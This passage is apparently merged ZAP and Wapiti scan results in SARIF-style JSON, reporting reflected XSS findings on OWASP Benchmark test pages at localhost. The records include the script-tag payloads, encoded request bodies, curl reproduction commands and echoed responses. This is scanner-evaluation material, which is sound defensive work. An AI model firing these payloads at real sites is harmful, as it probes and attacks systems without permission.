            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01284', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '102', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01284.html?BenchmarkTest01284=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'ZW1haWw9emFwcm94eSU0MGV4YW1wbGUuY29tJnBhc3N3b3JkPVpBUCZCZW5jaG1hcmtUZXN0MDEyODQ9JTNDc2NySXB0JTNFYWxlcnQlMjgxJTI5JTNCJTNDJTJGc2NSaXB0JTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01284', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01284.html', 'content-length': '125', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest01284=%3CScRiPt%3Ealert%28%27w4ng87v3zp%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '43', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:57 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Parameter value: <scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '53', 'date': 'Sun, 31 Aug 2025 04:24:42 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Parameter value: <ScRiPt>alert('w4ng87v3zp')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-02/BenchmarkTest01335",
                    "Wapiti - https://localhost:8444/benchmark/xss-02/BenchmarkTest01335?secure=default&productID=default&foo=foo&BenchmarkTest01335=%3CScRiPt%3Ealert%28%27w37q2sl3rg%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 4",
                    "Wapiti - 4"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - </p><scrIpt>alert(1);</scRipt><p>",
                      "Wapiti - <ScRiPt>alert('w37q2sl3rg')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - </p><scrIpt>alert(1);</scRipt><p>",
                  "Wapiti - <ScRiPt>alert('w37q2sl3rg')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01335\" -e \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01335.html\" -d \"secure=default&productID=default&foo=foo&BenchmarkTest01335=%3CScRiPt%3Ealert%28%27w37q2sl3rg%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01335"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01335', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '111', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01335.html?BenchmarkTest01335=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'c2VjdXJlPVpBUCZwcm9kdWN0SUQ9WkFQJmZvbz1mb28mQmVuY2htYXJrVGVzdDAxMzM1PSUzQyUyRnAlM0UlM0NzY3JJcHQlM0VhbGVydCUyODElMjklM0IlM0MlMkZzY1JpcHQlM0UlM0NwJTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01335', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01335.html', 'content-length': '114', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'secure=default&productID=default&foo=foo&BenchmarkTest01335=%3CScRiPt%3Ealert%28%27w37q2sl3rg%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '110', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:57 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<!DOCTYPE html>\\n<html>\\n<body>\\n<p>Formatted like: a and </p><scrIpt>alert(1);</scRipt><p>.\\n</p>\\n</body>\\n</html>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '113', 'date': 'Sun, 31 Aug 2025 04:24:42 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<!DOCTYPE html>\\n<html>\\n<body>\\n<p>Formatted like: a and <ScRiPt>alert('w37q2sl3rg')</sCrIpT>.\\n</p>\\n</body>\\n</html>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-02/BenchmarkTest01337",
                    "Wapiti - https://localhost:8444/benchmark/xss-02/BenchmarkTest01337?BenchmarkTest01337=%3CScRiPt%3Ealert%28%27wk4pg63n7x%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wk4pg63n7x')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wk4pg63n7x')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01337\" -e \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01337.html?BenchmarkTest01337=SafeText\" -d \"BenchmarkTest01337=%3CScRiPt%3Ealert%28%27wk4pg63n7x%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01337"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01337', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '61', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01337.html?BenchmarkTest01337=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAxMzM3PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01337', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01337.html?BenchmarkTest01337=SafeText', 'content-length': '73', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest01337=%3CScRiPt%3Ealert%28%27wk4pg63n7x%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '36', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:56 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>_SafeStuff'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '46', 'date': 'Sun, 31 Aug 2025 04:24:43 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wk4pg63n7x')</sCrIpT>_SafeStuff\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-02/BenchmarkTest01346",
                    "Wapiti - https://localhost:8444/benchmark/xss-02/BenchmarkTest01346?BenchmarkTest01346=SafeText&BenchmarkTest01346=Movies&BenchmarkTest01346=Writing&BenchmarkTest01346=%3CScRiPt%3Ealert%28%27wpdlgogk6w%27%29%3C%2FsCrIpT%3E&foo=bar"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wpdlgogk6w')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wpdlgogk6w')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01346\" -e \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01346.html\" -d \"BenchmarkTest01346=SafeText&BenchmarkTest01346=Movies&BenchmarkTest01346=Writing&BenchmarkTest01346=%3CScRiPt%3Ealert%28%27wpdlgogk6w%27%29%3C%2FsCrIpT%3E&foo=bar\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01346"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01346', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '69', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01346.html?BenchmarkTest01346=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAxMzQ2PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRSZmb289YmFy'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01346', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01346.html', 'content-length': '81', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest01346=SafeText&BenchmarkTest01346=Movies&BenchmarkTest01346=Writing&BenchmarkTest01346=%3CScRiPt%3Ealert%28%27wpdlgogk6w%27%29%3C%2FsCrIpT%3E&foo=bar'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '27', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:57 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>\\n'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '37', 'date': 'Sun, 31 Aug 2025 04:24:54 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wpdlgogk6w')</sCrIpT>\\n\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-02/BenchmarkTest01347",
                    "Wapiti - https://localhost:8444/benchmark/xss-02/BenchmarkTest01347?BenchmarkTest01347=%3CScRiPt%3Ealert%28%27wj7srlj0a1%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wj7srlj0a1')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wj7srlj0a1')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01347\" -e \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01347.html\" -d \"BenchmarkTest01347=%3CScRiPt%3Ealert%28%27wj7srlj0a1%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01347"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01347', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '61', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01347.html?BenchmarkTest01347=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAxMzQ3PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01347', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01347.html', 'content-length': '73', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest01347=%3CScRiPt%3Ealert%28%27wj7srlj0a1%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '27', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:57 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>\\n'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '37', 'date': 'Sun, 31 Aug 2025 04:24:54 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wj7srlj0a1')</sCrIpT>\\n\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-02/BenchmarkTest01349",
